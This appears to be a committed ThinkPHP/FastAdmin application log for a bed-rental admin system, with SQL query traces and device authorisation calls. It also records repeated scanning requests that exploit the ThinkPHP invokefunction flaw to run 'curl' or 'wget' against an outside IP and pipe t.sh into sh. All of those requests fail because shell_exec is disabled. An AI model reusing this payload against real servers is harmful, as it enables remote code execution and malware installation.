+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000355s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_rule` [ RunTime:0.000472s ]
+[ sql ] [ SQL ] SELECT `id`,`pid`,`condition`,`icon`,`name`,`title`,`ismenu` FROM `fa_auth_rule` WHERE  `status` = 'normal'  AND `id` IN (1,2,6,7,8,9,10,11,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,40,41,42,43,44,45,46,47,48,49,50,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,183,184,189,190,191,192,193,194,197,198,199,200,201,202,203,204,205,206,207,208,209,211,5,131,182,181,188) [ RunTime:0.001195s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group` [ RunTime:0.000582s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000294s ]
+[ sql ] [ SQL ] SELECT `uid`,`group_id` FROM `fa_auth_group_access` WHERE  `group_id` IN (3,14,17,18,19,20,24,23,25,26) [ RunTime:0.000295s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_bedorder` [ RunTime:0.000563s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_netpoint` [ RunTime:0.000525s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_device` [ RunTime:0.000520s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_bedorder` `bedorder` LEFT JOIN `fa_netpoint` `netpoint` ON `bedorder`.`netpoint_id`=`netpoint`.`id` LEFT JOIN `fa_device` `device` ON `bedorder`.`dev_id`=`device`.`dev_id` WHERE  (  `bedorder`.`admin_id` IN (7,10,11,15,16,17,2) ) ORDER BY `bedorder`.`order_no` DESC LIMIT 1 [ RunTime:0.003784s ]
+[ sql ] [ SQL ] SELECT `bedorder`.`order_no`,`bedorder`.`users_id`,`bedorder`.`phone`,`bedorder`.`dev_id`,`bedorder`.`admin_id`,`bedorder`.`entity_id`,`bedorder`.`netpoint_id`,`bedorder`.`pricetype`,`bedorder`.`price_id`,`bedorder`.`deposit`,`bedorder`.`lightnight`,`bedorder`.`canusestart`,`bedorder`.`canuseend`,`bedorder`.`hourprice`,`bedorder`.`lighttimesprice`,`bedorder`.`nighttimesprice`,`bedorder`.`dayprice`,`bedorder`.`days`,`bedorder`.`pricedata`,`bedorder`.`total`,`bedorder`.`save`,`bedorder`.`pay`,`bedorder`.`tran_id`,`bedorder`.`refund`,`bedorder`.`refundtime`,`bedorder`.`refundnote`,`bedorder`.`step`,`bedorder`.`status`,`bedorder`.`rtn_admin_id`,`bedorder`.`createtime`,`bedorder`.`endtime`,netpoint.id AS netpoint__id,netpoint.admin_id AS netpoint__admin_id,netpoint.name AS netpoint__name,netpoint.shortname AS netpoint__shortname,netpoint.netaddr AS netpoint__netaddr,netpoint.netlng AS netpoint__netlng,netpoint.netlat AS netpoint__netlat,netpoint.deposit AS netpoint__deposit,netpoint.level1 AS netpoint__level1,netpoint.level2 AS netpoint__level2,netpoint.level3 AS netpoint__level3,netpoint.level4 AS netpoint__level4,netpoint.percent1 AS netpoint__percent1,netpoint.percent2 AS netpoint__percent2,netpoint.percent3 AS netpoint__percent3,netpoint.percent4 AS netpoint__percent4,netpoint.mt_admin_id AS netpoint__mt_admin_id,netpoint.mall_admin_id AS netpoint__mall_admin_id,netpoint.status AS netpoint__status,device.id AS device__id,device.dev_id AS device__dev_id,device.iscabinet AS device__iscabinet,device.devtype_id AS device__devtype_id,device.price_id AS device__price_id,device.netpoint_id AS device__netpoint_id,device.department AS device__department,device.room AS device__room,device.bed AS device__bed,device.entity_id AS device__entity_id,device.admin_id AS device__admin_id,device.mac AS device__mac,device.blekey AS device__blekey,device.blepwd AS device__blepwd,device.mac2 AS device__mac2,device.blekey2 AS device__blekey2,device.blepwd2 AS device__blepwd2,device.createtime AS device__createtime,device.updatetime AS device__updatetime,device.status AS device__status FROM `fa_bedorder` `bedorder` LEFT JOIN `fa_netpoint` `netpoint` ON `bedorder`.`netpoint_id`=`netpoint`.`id` LEFT JOIN `fa_device` `device` ON `bedorder`.`dev_id`=`device`.`dev_id` WHERE  (  `bedorder`.`admin_id` IN (7,10,11,15,16,17,2) ) ORDER BY `bedorder`.`order_no` DESC LIMIT 0,10 [ RunTime:0.000619s ]
+---------------------------------------------------------------
+[ 2020-03-16T10:54:42+08:00 ] 36.17.122.128 GET /admin/order/bedorder/index?sort=order_no&order=desc&offset=0&limit=10&filter=%7B%7D&op=%7B%7D&_=1584326783801
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000612s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000588s ]
+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000422s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_rule` [ RunTime:0.000555s ]
+[ sql ] [ SQL ] SELECT `id`,`pid`,`condition`,`icon`,`name`,`title`,`ismenu` FROM `fa_auth_rule` WHERE  `status` = 'normal'  AND `id` IN (1,2,6,7,8,9,10,11,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,40,41,42,43,44,45,46,47,48,49,50,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,183,184,189,190,191,192,193,194,197,198,199,200,201,202,203,204,205,206,207,208,209,211,5,131,182,181,188) [ RunTime:0.001203s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group` [ RunTime:0.000560s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000291s ]
+[ sql ] [ SQL ] SELECT `uid`,`group_id` FROM `fa_auth_group_access` WHERE  `group_id` IN (3,14,17,18,19,20,24,23,25,26) [ RunTime:0.000330s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_bedorder` [ RunTime:0.000519s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_netpoint` [ RunTime:0.000478s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_device` [ RunTime:0.000500s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_bedorder` `bedorder` LEFT JOIN `fa_netpoint` `netpoint` ON `bedorder`.`netpoint_id`=`netpoint`.`id` LEFT JOIN `fa_device` `device` ON `bedorder`.`dev_id`=`device`.`dev_id` WHERE  (  `bedorder`.`admin_id` IN (7,10,11,15,16,17,2) ) ORDER BY `bedorder`.`order_no` DESC LIMIT 1 [ RunTime:0.003832s ]
+[ sql ] [ SQL ] SELECT `bedorder`.`order_no`,`bedorder`.`users_id`,`bedorder`.`phone`,`bedorder`.`dev_id`,`bedorder`.`admin_id`,`bedorder`.`entity_id`,`bedorder`.`netpoint_id`,`bedorder`.`pricetype`,`bedorder`.`price_id`,`bedorder`.`deposit`,`bedorder`.`lightnight`,`bedorder`.`canusestart`,`bedorder`.`canuseend`,`bedorder`.`hourprice`,`bedorder`.`lighttimesprice`,`bedorder`.`nighttimesprice`,`bedorder`.`dayprice`,`bedorder`.`days`,`bedorder`.`pricedata`,`bedorder`.`total`,`bedorder`.`save`,`bedorder`.`pay`,`bedorder`.`tran_id`,`bedorder`.`refund`,`bedorder`.`refundtime`,`bedorder`.`refundnote`,`bedorder`.`step`,`bedorder`.`status`,`bedorder`.`rtn_admin_id`,`bedorder`.`createtime`,`bedorder`.`endtime`,netpoint.id AS netpoint__id,netpoint.admin_id AS netpoint__admin_id,netpoint.name AS netpoint__name,netpoint.shortname AS netpoint__shortname,netpoint.netaddr AS netpoint__netaddr,netpoint.netlng AS netpoint__netlng,netpoint.netlat AS netpoint__netlat,netpoint.deposit AS netpoint__deposit,netpoint.level1 AS netpoint__level1,netpoint.level2 AS netpoint__level2,netpoint.level3 AS netpoint__level3,netpoint.level4 AS netpoint__level4,netpoint.percent1 AS netpoint__percent1,netpoint.percent2 AS netpoint__percent2,netpoint.percent3 AS netpoint__percent3,netpoint.percent4 AS netpoint__percent4,netpoint.mt_admin_id AS netpoint__mt_admin_id,netpoint.mall_admin_id AS netpoint__mall_admin_id,netpoint.status AS netpoint__status,device.id AS device__id,device.dev_id AS device__dev_id,device.iscabinet AS device__iscabinet,device.devtype_id AS device__devtype_id,device.price_id AS device__price_id,device.netpoint_id AS device__netpoint_id,device.department AS device__department,device.room AS device__room,device.bed AS device__bed,device.entity_id AS device__entity_id,device.admin_id AS device__admin_id,device.mac AS device__mac,device.blekey AS device__blekey,device.blepwd AS device__blepwd,device.mac2 AS device__mac2,device.blekey2 AS device__blekey2,device.blepwd2 AS device__blepwd2,device.createtime AS device__createtime,device.updatetime AS device__updatetime,device.status AS device__status FROM `fa_bedorder` `bedorder` LEFT JOIN `fa_netpoint` `netpoint` ON `bedorder`.`netpoint_id`=`netpoint`.`id` LEFT JOIN `fa_device` `device` ON `bedorder`.`dev_id`=`device`.`dev_id` WHERE  (  `bedorder`.`admin_id` IN (7,10,11,15,16,17,2) ) ORDER BY `bedorder`.`order_no` DESC LIMIT 0,10 [ RunTime:0.000576s ]
+---------------------------------------------------------------
+[ 2020-03-16T11:15:43+08:00 ] 36.17.122.128 GET /admin/order/bedorder/index?sort=order_no&order=desc&offset=0&limit=10&filter=%7B%7D&op=%7B%7D&_=1584326783802
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000666s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000660s ]
+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000352s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_rule` [ RunTime:0.000474s ]
+[ sql ] [ SQL ] SELECT `id`,`pid`,`condition`,`icon`,`name`,`title`,`ismenu` FROM `fa_auth_rule` WHERE  `status` = 'normal'  AND `id` IN (1,2,6,7,8,9,10,11,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,40,41,42,43,44,45,46,47,48,49,50,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,183,184,189,190,191,192,193,194,197,198,199,200,201,202,203,204,205,206,207,208,209,211,5,131,182,181,188) [ RunTime:0.001184s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group` [ RunTime:0.000593s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000321s ]
+[ sql ] [ SQL ] SELECT `uid`,`group_id` FROM `fa_auth_group_access` WHERE  `group_id` IN (3,14,17,18,19,20,24,23,25,26) [ RunTime:0.000289s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_bedorder` [ RunTime:0.000544s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_netpoint` [ RunTime:0.000463s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_device` [ RunTime:0.000551s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_bedorder` `bedorder` LEFT JOIN `fa_netpoint` `netpoint` ON `bedorder`.`netpoint_id`=`netpoint`.`id` LEFT JOIN `fa_device` `device` ON `bedorder`.`dev_id`=`device`.`dev_id` WHERE  (  `bedorder`.`admin_id` IN (7,10,11,15,16,17,2) ) ORDER BY `bedorder`.`order_no` DESC LIMIT 1 [ RunTime:0.003842s ]
+[ sql ] [ SQL ] SELECT `bedorder`.`order_no`,`bedorder`.`users_id`,`bedorder`.`phone`,`bedorder`.`dev_id`,`bedorder`.`admin_id`,`bedorder`.`entity_id`,`bedorder`.`netpoint_id`,`bedorder`.`pricetype`,`bedorder`.`price_id`,`bedorder`.`deposit`,`bedorder`.`lightnight`,`bedorder`.`canusestart`,`bedorder`.`canuseend`,`bedorder`.`hourprice`,`bedorder`.`lighttimesprice`,`bedorder`.`nighttimesprice`,`bedorder`.`dayprice`,`bedorder`.`days`,`bedorder`.`pricedata`,`bedorder`.`total`,`bedorder`.`save`,`bedorder`.`pay`,`bedorder`.`tran_id`,`bedorder`.`refund`,`bedorder`.`refundtime`,`bedorder`.`refundnote`,`bedorder`.`step`,`bedorder`.`status`,`bedorder`.`rtn_admin_id`,`bedorder`.`createtime`,`bedorder`.`endtime`,netpoint.id AS netpoint__id,netpoint.admin_id AS netpoint__admin_id,netpoint.name AS netpoint__name,netpoint.shortname AS netpoint__shortname,netpoint.netaddr AS netpoint__netaddr,netpoint.netlng AS netpoint__netlng,netpoint.netlat AS netpoint__netlat,netpoint.deposit AS netpoint__deposit,netpoint.level1 AS netpoint__level1,netpoint.level2 AS netpoint__level2,netpoint.level3 AS netpoint__level3,netpoint.level4 AS netpoint__level4,netpoint.percent1 AS netpoint__percent1,netpoint.percent2 AS netpoint__percent2,netpoint.percent3 AS netpoint__percent3,netpoint.percent4 AS netpoint__percent4,netpoint.mt_admin_id AS netpoint__mt_admin_id,netpoint.mall_admin_id AS netpoint__mall_admin_id,netpoint.status AS netpoint__status,device.id AS device__id,device.dev_id AS device__dev_id,device.iscabinet AS device__iscabinet,device.devtype_id AS device__devtype_id,device.price_id AS device__price_id,device.netpoint_id AS device__netpoint_id,device.department AS device__department,device.room AS device__room,device.bed AS device__bed,device.entity_id AS device__entity_id,device.admin_id AS device__admin_id,device.mac AS device__mac,device.blekey AS device__blekey,device.blepwd AS device__blepwd,device.mac2 AS device__mac2,device.blekey2 AS device__blekey2,device.blepwd2 AS device__blepwd2,device.createtime AS device__createtime,device.updatetime AS device__updatetime,device.status AS device__status FROM `fa_bedorder` `bedorder` LEFT JOIN `fa_netpoint` `netpoint` ON `bedorder`.`netpoint_id`=`netpoint`.`id` LEFT JOIN `fa_device` `device` ON `bedorder`.`dev_id`=`device`.`dev_id` WHERE  (  `bedorder`.`admin_id` IN (7,10,11,15,16,17,2) ) ORDER BY `bedorder`.`order_no` DESC LIMIT 0,10 [ RunTime:0.000655s ]
+---------------------------------------------------------------
+[ 2020-03-16T11:15:44+08:00 ] 36.17.122.128 GET /admin/order/bedorder/index?sort=order_no&order=desc&offset=0&limit=10&filter=%7B%7D&op=%7B%7D&_=1584326783803
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000667s ] mysql:host=127.0.0.1;dbname=share;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group_access` [ RunTime:0.000646s ]
+[ sql ] [ SQL ] SELECT `aga`.`uid`,`aga`.`group_id`,`ag`.`id`,`ag`.`pid`,`ag`.`name`,`ag`.`rules` FROM `fa_auth_group_access` `aga` LEFT JOIN `fa_auth_group` `ag` ON `aga`.`group_id`=`ag`.`id` WHERE  (  aga.uid='2' and ag.status='normal' ) [ RunTime:0.000350s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_rule` [ RunTime:0.000472s ]
+[ sql ] [ SQL ] SELECT `id`,`pid`,`condition`,`icon`,`name`,`title`,`ismenu` FROM `fa_auth_rule` WHERE  `status` = 'normal'  AND `id` IN (1,2,6,7,8,9,10,11,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,40,41,42,43,44,45,46,47,48,49,50,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,183,184,189,190,191,192,193,194,197,198,199,200,201,202,203,204,205,206,207,208,209,211,5,131,182,181,188) [ RunTime:0.001179s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_auth_group` [ RunTime:0.000603s ]
+[ sql ] [ SQL ] SELECT * FROM `fa_auth_group` WHERE  `status` = 'normal' [ RunTime:0.000327s ]
+[ sql ] [ SQL ] SELECT `uid`,`group_id` FROM `fa_auth_group_access` WHERE  `group_id` IN (3,14,17,18,19,20,24,23,25,26) [ RunTime:0.000294s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_bedorder` [ RunTime:0.000521s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_netpoint` [ RunTime:0.000517s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_device` [ RunTime:0.000528s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fa_bedorder` `bedorder` LEFT JOIN `fa_netpoint` `netpoint` ON `bedorder`.`netpoint_id`=`netpoint`.`id` LEFT JOIN `fa_device` `device` ON `bedorder`.`dev_id`=`device`.`dev_id` WHERE  (  `bedorder`.`admin_id` IN (7,10,11,15,16,17,2) ) ORDER BY `bedorder`.`order_no` DESC LIMIT 1 [ RunTime:0.003791s ]
+[ sql ] [ SQL ] SELECT `bedorder`.`order_no`,`bedorder`.`users_id`,`bedorder`.`phone`,`bedorder`.`dev_id`,`bedorder`.`admin_id`,`bedorder`.`entity_id`,`bedorder`.`netpoint_id`,`bedorder`.`pricetype`,`bedorder`.`price_id`,`bedorder`.`deposit`,`bedorder`.`lightnight`,`bedorder`.`canusestart`,`bedorder`.`canuseend`,`bedorder`.`hourprice`,`bedorder`.`lighttimesprice`,`bedorder`.`nighttimesprice`,`bedorder`.`dayprice`,`bedorder`.`days`,`bedorder`.`pricedata`,`bedorder`.`total`,`bedorder`.`save`,`bedorder`.`pay`,`bedorder`.`tran_id`,`bedorder`.`refund`,`bedorder`.`refundtime`,`bedorder`.`refundnote`,`bedorder`.`step`,`bedorder`.`status`,`bedorder`.`rtn_admin_id`,`bedorder`.`createtime`,`bedorder`.`endtime`,netpoint.id AS netpoint__id,netpoint.admin_id AS netpoint__admin_id,netpoint.name AS netpoint__name,netpoint.shortname AS netpoint__shortname,netpoint.netaddr AS netpoint__netaddr,netpoint.netlng AS netpoint__netlng,netpoint.netlat AS netpoint__netlat,netpoint.deposit AS netpoint__deposit,netpoint.level1 AS netpoint__level1,netpoint.level2 AS netpoint__level2,netpoint.level3 AS netpoint__level3,netpoint.level4 AS netpoint__level4,netpoint.percent1 AS netpoint__percent1,netpoint.percent2 AS netpoint__percent2,netpoint.percent3 AS netpoint__percent3,netpoint.percent4 AS netpoint__percent4,netpoint.mt_admin_id AS netpoint__mt_admin_id,netpoint.mall_admin_id AS netpoint__mall_admin_id,netpoint.status AS netpoint__status,device.id AS device__id,device.dev_id AS device__dev_id,device.iscabinet AS device__iscabinet,device.devtype_id AS device__devtype_id,device.price_id AS device__price_id,device.netpoint_id AS device__netpoint_id,device.department AS device__department,device.room AS device__room,device.bed AS device__bed,device.entity_id AS device__entity_id,device.admin_id AS device__admin_id,device.mac AS device__mac,device.blekey AS device__blekey,device.blepwd AS device__blepwd,device.mac2 AS device__mac2,device.blekey2 AS device__blekey2,device.blepwd2 AS device__blepwd2,device.createtime AS device__createtime,device.updatetime AS device__updatetime,device.status AS device__status FROM `fa_bedorder` `bedorder` LEFT JOIN `fa_netpoint` `netpoint` ON `bedorder`.`netpoint_id`=`netpoint`.`id` LEFT JOIN `fa_device` `device` ON `bedorder`.`dev_id`=`device`.`dev_id` WHERE  (  `bedorder`.`admin_id` IN (7,10,11,15,16,17,2) ) ORDER BY `bedorder`.`order_no` DESC LIMIT 0,10 [ RunTime:0.000586s ]
+---------------------------------------------------------------
+[ 2020-03-16T11:24:06+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T11:24:08+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T11:57:34+08:00 ] 221.178.125.102 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"C24191F40710"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T11:57:42+08:00 ] 117.132.192.188 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"D187FC92ACAA"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T11:57:51+08:00 ] 117.132.192.188 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"D187FC92ACAA"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T12:12:31+08:00 ] 218.204.252.136 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"D4F5268B6A63"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T12:12:37+08:00 ] 218.204.252.136 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"D4F5268B6A63"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T12:31:54+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T12:31:55+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T13:23:51+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T13:23:55+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T13:50:45+08:00 ] 218.204.252.122 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"D68156CDD97D"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T13:50:48+08:00 ] 218.204.252.122 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"D68156CDD97D"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T14:30:38+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T14:30:39+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T15:22:05+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T15:22:06+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T16:15:15+08:00 ] 218.204.253.234 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F6B55ED1A919"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T16:25:21+08:00 ] 221.178.127.101 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"E19B5C873082"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T16:28:00+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T16:28:01+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T17:29:06+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T17:29:08+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T17:38:31+08:00 ] 218.204.252.179 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F30571A7DB06"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T17:38:36+08:00 ] 218.204.252.179 POST /api/Bedorder/queryauth
+[ info ] queryauth request: 
+[ info ] {"mac":"F30571A7DB06"}
+[ info ] queryauth response: 
+[ info ] 1
+---------------------------------------------------------------
+[ 2020-03-16T18:29:10+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T18:29:11+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T19:30:09+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T19:30:10+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T20:24:28+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-03-16T20:24:29+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
